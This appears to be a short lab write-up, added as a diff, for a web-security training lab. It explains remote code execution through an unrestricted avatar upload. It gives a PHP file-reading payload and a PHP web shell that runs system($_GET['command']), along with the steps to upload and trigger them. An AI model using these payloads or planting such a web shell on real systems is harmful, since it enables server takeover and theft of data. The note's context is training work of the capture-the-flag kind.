@@ -1,0 +1,22 @@
+# PHP RCE
+
+CMD1: <?php echo file_get_contents('/path/to/target/file'); ?>
+
+upload a file called <file_name>.php as your profile with payload <?php echo file_get_contents('/home/carlos/secret'); ?>
+
+now in burp, send the request: GET /files/avatars/<file_name>.php HTTP/2
+                               Host: <your_labID>.web-security-academy.net
+
+or visit: https://<your_labID>.web-security-academy.net/files/avatars/<file_name>.php in a browser
+
+
+
+
+
+CMD2: <?php echo system($_GET['command']); ?>
+
+upload a file called <file_name>.php as your profile with payload CMD2: <?php echo system($_GET['command']); ?>
+
+now, visit https://<your_labID>.web-security-academy.net/files/avatars/<file_name>.php in a browser
+
+modify the url to something like /<file_name>.php?command=<command_you_wanna_execute>
